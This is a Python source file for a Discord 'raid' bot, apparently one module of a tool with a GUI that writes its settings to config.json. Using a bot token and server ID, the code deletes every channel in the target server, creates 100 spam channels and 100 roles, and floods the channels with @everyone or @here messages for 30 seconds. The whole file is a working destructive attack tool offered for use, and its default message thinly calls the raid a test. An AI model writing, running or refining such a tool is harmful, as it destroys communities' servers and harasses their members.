import discord
from discord.ext import commands
import asyncio
import json
import traceback
import sys

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True  # For @everyone mention

bot = commands.Bot(command_prefix="!", intents=intents)

# Global variables to hold config; will be set in run_bot()
TOKEN = None
GUILD_ID = None
MESSAGE = None
CHANNEL_NAME = None
PING_EVERYONE = None
PING_HERE = None

def load_config():
    """Load configuration from config.json and return as dict."""
    try:
        with open("config.json", "r") as f:
            config = json.load(f)
        return config
    except FileNotFoundError:
        print("config.json not found. Please run main.py first.")
        sys.exit(1)
    except json.JSONDecodeError:
        print("config.json is corrupted. Delete it and run main.py to recreate.")
        sys.exit(1)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print(f"Guild with ID {GUILD_ID} not found. Check the ID and bot permissions.")
        await bot.close()
        return
    
    print(f"Starting raid on {guild.name}")
    raid_task = asyncio.create_task(raid(guild))
    
    await asyncio.sleep(30)
    print("30 seconds elapsed, stopping bot.")
    raid_task.cancel()
    try:
        await raid_task
    except asyncio.CancelledError:
        pass
    await bot.close()

async def raid(guild):
    try:
        # 1. Delete all existing channels
        print("Deleting all channels...")
        for channel in guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.25)  # Avoid rate limits
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")
        
        # 2. Create 100 new text channels
        print("Creating channels...")
        channels = []
        for i in range(100):
            try:
                new_channel = await guild.create_text_channel(f"{CHANNEL_NAME}-{i}")
                channels.append(new_channel)
                await asyncio.sleep(0.25)
            except Exception as e:
                print(f"Failed to create channel {i}: {e}")
        
        # 3. Create 100 new roles
        print("Creating roles...")
        for i in range(100):
            try:
                await guild.create_role(name=f"RaidRole-{i}")
                await asyncio.sleep(0.25)
            except Exception as e:
                print(f"Failed to create role {i}: {e}")
        
        # 4. Spam messages with mentions
        print("Spamming messages...")
        content = MESSAGE
        if PING_EVERYONE:
            content = "@everyone " + content
        if PING_HERE:
            content = "@here " + content
        
        while True:  # Will be cancelled after 30s
            for channel in channels[:]:  # Use copy in case of removal
                try:
                    await channel.send(content)
                    await asyncio.sleep(0.25)  # ~4 messages/sec total
                except discord.NotFound:
                    channels.remove(channel)  # Channel deleted externally
                except Exception as e:
                    print(f"Failed to send in {channel.name}: {e}")
            await asyncio.sleep(0.1)
    except asyncio.CancelledError:
        print("Raid task cancelled.")
        raise
    except Exception as e:
        print(f"Unexpected error in raid: {e}")
        traceback.print_exc()

def run_bot():
    """Entry point to start the bot. Loads config and runs."""
    global TOKEN, GUILD_ID, MESSAGE, CHANNEL_NAME, PING_EVERYONE, PING_HERE
    
    config = load_config()
    TOKEN = config.get("token", "")
    GUILD_ID = int(config.get("guild_id", 0))
    MESSAGE = config.get("message", "@everyone This server is being tested!")
    CHANNEL_NAME = config.get("channel_name", "raid-channel")
    PING_EVERYONE = config.get("ping_everyone", True)
    PING_HERE = config.get("ping_here", False)
    
    if not TOKEN or not GUILD_ID:
        print("Token or Guild ID missing in config.json. Please set them via the GUI.")
        return
    
    bot.run(TOKEN)